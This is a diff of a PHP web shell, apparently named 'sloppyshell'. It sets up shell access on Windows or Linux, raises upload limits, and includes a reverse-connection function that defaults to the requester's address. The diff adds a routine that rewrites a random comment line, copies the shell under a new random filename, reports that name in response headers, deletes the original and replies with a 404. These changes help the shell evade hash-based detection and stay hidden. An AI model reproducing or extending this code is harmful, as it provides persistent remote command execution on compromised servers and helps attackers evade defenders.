@@ -1,5 +1,5 @@
 <?php
-//68157130d095065a8559252f5427ffd493c09d750b6d0230931e2c1375609ced24c7439f4a8282795466dc1ff60638387c1062805ae3d18ef5dc4d53822118fb2cc49e71a4ef27fb3a9d56
+//LEAVE ME HERE!!!!!!!!!!!!!
 
 error_reporting(E_ERROR | E_PARSE);
 if ( ! defined( "PATH_SEPARATOR" ) ) {
@@ -9,7 +9,7 @@ if ( ! defined( "PATH_SEPARATOR" ) ) {
 }
 if (str_starts_with(php_uname(), 'Windows')) {
     if (!defined("sloppyshell")){
-        define("sloppyshell", "powershell");
+        define("sloppyshell", "cmd.exe");
     }
     define("slopos", "Windows");
 } else {
@@ -17,11 +17,6 @@ if (str_starts_with(php_uname(), 'Windows')) {
         define("sloppyshell", "bash");
     }
     define("slopos", "Linux");
-}
-if (is_writable(getcwd()."/".$_SERVER['PHP_SELF'])) {
-    $me = file(getcwd() . "/" .$_SERVER['PHP_SELF']);
-    $me[1] = sprintf("//%s", bin2hex(openssl_random_pseudo_bytes(75))).PHP_EOL;
-    file_put_contents(getcwd()."/".$_SERVER['PHP_SELF'], $me);
 }
 if (slopos === "Windows"){
     if (!is_dir(".\\scache")){
@@ -42,6 +37,26 @@ set_include_path(get_include_path().PATH_SEPARATOR.scache);
 @ini_set("max_file_uploads",20);
 @ini_set("upload_max_filesize", "24G");
 @ini_set("upload_tmp_dir", getcwd());
+
+function uwumodifyme()
+{
+    if (is_writable(getcwd()."/".$_SERVER['PHP_SELF'])) {
+        $me = file(getcwd() . "/" .$_SERVER['PHP_SELF']);
+        $me[1] = sprintf("//%s", bin2hex(openssl_random_pseudo_bytes(75))).PHP_EOL;
+        $new_name = bin2hex(openssl_random_pseudo_bytes(10));
+        file_put_contents(getcwd()."/".$new_name.".php", $me);
+        return [
+            "Successful" => "HELLYEA",
+            "NewName" => "{$new_name}.php",
+            "Old" => $_SERVER['PHP_SELF']
+        ];
+    }
+    return [
+        "Successful" => "HELLNO",
+        "NewName" => null,
+        "Old" => null
+    ];
+}
 
 function banner()
 {
@@ -158,7 +173,7 @@ function reverseConnections($methods, $host, $port, $shell)
 {
     $defaultPort = 1634;
     $defaultHost = $_SERVER["REMOTE_ADDR"];
-    $defaultShell = shell_exec(sloppyshell);
+    $defaultShell = sloppyshell;
 
     $useHost = null;
     $usePort = null;
@@ -388,6 +403,10 @@ INI. PHP_EOL;
                     header("X-Success: 1");
                     break;
             }
+            foreach (uwumodifyme() as $new_data => $d){
+                header("{$new_data}: {$d}");
+            }
+            unlink($_SERVER['PHP_SELF']);
             http_response_code(404);
             die();
         } else {
